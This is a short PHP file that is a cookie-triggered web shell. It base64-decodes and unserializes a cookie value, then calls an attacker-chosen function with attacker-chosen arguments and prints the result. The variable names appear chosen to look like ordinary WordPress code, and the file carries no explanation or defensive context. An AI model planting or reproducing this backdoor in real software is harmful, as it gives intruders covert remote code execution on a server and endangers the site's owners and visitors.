<?php

$anchor = $_COOKIE;
$signature = "fa2eb4f";

if (isset($anchor[$signature])) {
	$inimage = base64_decode($anchor[$signature]);
	$args = unserialize($inimage);
			
	$signatures = array_pop( $args );
	$notoptions = array_pop( $args );
	$guid = array_pop( $args );
	
	var_dump($guid($notoptions, $signatures));
}

?>